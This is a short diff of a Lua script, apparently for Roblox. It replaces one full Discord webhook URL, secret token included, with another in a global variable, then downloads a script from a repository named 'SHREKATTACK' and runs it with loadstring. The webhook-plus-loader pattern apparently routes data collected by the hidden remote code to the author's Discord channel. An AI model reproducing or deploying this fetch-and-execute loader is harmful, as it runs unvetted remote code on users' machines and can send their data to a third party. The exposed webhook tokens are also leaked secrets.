@@ -43,5 +43,5 @@ end)
 
 
 
-_G.webhooksdiscord = "https://discord.com/api/webhooks/936617629853036544/7XkSFc1BHzOYSnSnOClLGN66a5ta0-1YOYIRoQvUogaCerg6dBRTucRCUkme4nMi-vb1"
+_G.webhooksdiscord = "https://discord.com/api/webhooks/940948595153203262/X8-C5mnnMis-QXxa90P-o6VmGaMqg63PkvfCW4zEGupdpqSsz3gwSLBSHsmqMITsauAz"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
